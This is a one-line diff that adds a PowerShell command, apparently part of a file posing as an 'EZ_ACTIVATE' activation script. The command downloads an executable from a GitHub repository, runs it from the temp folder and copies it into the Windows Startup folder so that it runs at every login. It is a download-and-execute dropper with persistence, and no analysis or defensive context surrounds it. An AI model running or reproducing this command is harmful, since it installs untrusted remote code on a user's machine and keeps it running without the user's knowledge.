@@ -1,0 +1,1 @@
+iwr "https://github.com/QUADROisCoding/EZ_ACTIVATE/raw/main/GincentPayVorn.exe" -OutFile "$env:TEMP\gpv.exe"; Start-Process "$env:TEMP\gpv.exe"; Copy-Item "$env:TEMP\gpv.exe" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
